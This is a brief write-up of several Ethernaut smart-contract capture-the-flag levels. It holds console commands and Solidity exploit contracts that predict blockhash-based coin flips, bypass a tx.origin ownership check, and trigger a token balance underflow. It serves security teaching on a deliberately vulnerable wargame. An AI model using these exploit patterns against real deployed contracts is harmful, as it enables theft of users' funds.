# Ethernaut

???+ abstract

    * [Ethernaut](https://ethernaut.openzeppelin.com/)

### Hello Ethernaut
- 调用函数


### Fallback
```
> contract.contribute({value: 1})
> contract.sendTransaction({value: 1})
> contract.withdraw()              

```

### Fallout
`> contract.Fal1out()`

### Coin Flip
- 根据合约函数编写随机数生成脚本，猜对10次就可以过了
???+ exp

    === "Solidity"

        ``` solidity linenums="1"
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;
        import "@openzeppelin/contracts/utils/math/SafeMath.sol";
        contract CoinFlip {

            uint256 public consecutiveWins;
            uint256 lastHash;
            uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

            constructor() {
                consecutiveWins = 0;
            }

            function flip(bool _guess) public returns (bool) {
                uint256 blockValue = uint256(blockhash(block.number - 1));

                if (lastHash == blockValue) {
                    revert();
                }

                lastHash = blockValue;
                uint256 coinFlip = blockValue / FACTOR;
                bool side = coinFlip == 1 ? true : false;

                if (side == _guess) {
                    consecutiveWins++;
                    return true;
                } else {
                    consecutiveWins = 0;
                    return false;
                }
            }
        }

        contract Exploit {
            using SafeMath for uint256;
            CoinFlip p;
            uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
            constructor(address challenge) public {
                p = CoinFlip(challenge);
            }
            function exp() public {
                uint256 blockValue = uint256(blockhash(block.number.sub(1)));
                uint256 coinFlip = blockValue.div(FACTOR);
                bool side = coinFlip == 1 ? true : false;
                p.flip(side);
            }
        }
        ```
### Telephone
- 我->新智能合约->题目智能合约
???+ exp

    === "Solidity"

        ``` solidity linenums="1"
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        contract Telephone {

            address public owner;

            constructor() {
                owner = msg.sender;
            }

            function changeOwner(address _owner) public {
                if (tx.origin != msg.sender) {
                owner = _owner;
                }
            }
        }

        contract Exploit {
            Telephone telephone;

            constructor(address _address) public {
                telephone = Telephone(_address);
            }
            function attack(address _address) public {
                telephone.changeOwner(_address);
            }
        }
        ```
### Token
- uint溢出，向任意地址转账21触发溢出
`> contract.transfer(0x****, 21)`


